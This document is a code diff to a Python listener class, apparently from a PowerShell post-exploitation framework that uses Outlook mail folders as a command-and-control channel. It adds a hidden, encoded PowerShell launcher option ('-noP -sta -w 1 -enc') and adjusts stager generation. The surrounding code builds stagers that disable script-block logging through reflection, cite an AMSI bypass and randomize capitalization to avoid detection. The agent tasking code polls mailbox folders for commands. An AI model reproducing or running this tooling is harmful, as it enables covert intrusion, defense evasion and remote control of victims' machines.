@@ -63,6 +63,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
             },
+            'Launcher' : {
+                 'Description'   :   'Launcher string.',
+                 'Required'      :   True,
+                 'Value'         :   'powershell -noP -sta -w 1 -enc '
+             },
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
@@ -176,6 +181,7 @@ class Listener:
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
             host = listenerOptions['Host']['Value']
+            launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
@@ -208,7 +214,7 @@ class Listener:
                     stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}};")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
@@ -255,7 +261,7 @@ class Listener:
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
+                if encode:
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -280,7 +286,6 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
-        workingHours = listenerOptions['WorkingHours']['Value']
         folder = listenerOptions['Folder']['Value']
 
         if language.lower() == 'powershell':
@@ -297,10 +302,6 @@ class Listener:
             # patch the server and key information
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('REPLACE_FOLDER', folder)
-
-            # patch in working hours if any
-            if workingHours != "":
-                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -342,8 +343,8 @@ class Listener:
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
-        folder = listenerOptions['Folder']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        folder = listenerOptions['Folder']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -370,6 +371,8 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
+            if workingHours != "":
+                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
         else:
@@ -392,8 +395,11 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
+
                     $script:GetTask = {
                         try {
+                                # keep checking to see if there is response
+                                #write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -407,9 +413,9 @@ class Listener:
                                 $mail.save() | out-null;
                                 $mail.Move($fld)| out-null;
 
-                                # keep checking to see if there is response
                                 $break = $False;
                                 [byte[]]$b = @();
+                                $noTask = 0
 
                                 While ($break -ne $True){
                                   foreach ($item in $fld.Items) {
@@ -429,14 +435,14 @@ class Listener:
 
                         }
                         catch {
-
+                           #Start-Negotiate -S "$ser" -SK $sk -UA $ua;
                         }
                         while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                     }
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
+                   $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
